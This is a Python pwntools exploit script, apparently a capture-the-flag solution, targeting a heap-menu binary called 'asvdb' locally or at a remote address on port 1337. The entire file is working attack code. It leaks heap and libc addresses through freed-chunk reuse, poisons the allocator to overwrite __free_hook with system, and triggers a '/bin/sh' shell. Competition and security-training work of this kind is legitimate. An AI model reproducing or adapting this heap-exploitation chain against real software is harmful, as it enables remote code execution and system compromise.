#!/usr/bin/env python
from pwn import *

def create(size, desc='A', title='A', year=0, _id=0, severity=0):
    s.sendlineafter('> ', '1')
    s.sendlineafter('year: ', str(year))
    s.sendlineafter('id: ', str(_id))
    s.sendlineafter('chars): ', title)
    s.sendlineafter('size: ', str(size))
    if size > 0 and size < 0x100:
        desc += '\n' if len(desc) < size else ''
        s.sendafter('description: ', desc)
    s.sendlineafter('CRITICAL): ', str(severity))

def delete(index):
    s.sendlineafter('> ', '3')
    s.sendlineafter('index: ', str(index))

def show(index):
    s.sendlineafter('> ', '4')
    s.sendlineafter('index: ', str(index))

if len(sys.argv) == 1:
    s = process('./asvdb')
else:
    s = remote('37.139.17.37', 1337)

elf = ELF('./asvdb')
libc = ELF('./libc.so.6')

create(0x10)
delete(0)
create(0x100)
delete(0)
create(0x100)
show(0)
s.recvuntil('Description: ')
heap_addr = u64(s.recvline(False).ljust(8, '\0')) - 0x80
log.info('heap address: %#x' % heap_addr)

delete(0)
create(0x10, p64(heap_addr))
create(0x10)
create(0x10, p64(0) + p64(elf.got['puts']))
show(0)
s.recvuntil('title: ')
libc_base = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

delete(2)
delete(1)
create(0x100)
delete(1)
create(0x100)
delete(1)
create(0x10, p64(libc_base + libc.symbols['__free_hook'] - 0x8))
create(0x10)
create(0x10, '/bin/sh\0' + p64(libc_base + libc.symbols['system']))
delete(3)
s.interactive()
